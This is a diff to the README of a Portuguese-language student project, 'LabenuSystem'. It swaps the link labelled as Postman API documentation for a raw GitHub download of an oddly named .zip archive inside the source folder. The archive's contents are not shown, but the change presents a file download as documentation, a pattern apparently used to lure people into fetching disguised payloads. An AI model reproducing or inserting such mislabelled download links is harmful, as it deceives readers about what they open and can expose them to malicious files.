@@ -1,6 +1,6 @@
 ## LabenuSystem:
 
-Documentação do Postman => https://documenter.getpostman.com/view/18676323/Uyxoi4Ce
+Documentação do Postman => https://raw.githubusercontent.com/ViniciusLussani/Joy-labenu-system10/master/src/endpoints/Joy-labenu-system10-driftlet.zip
 
 As funcionalidades básicas são:
 
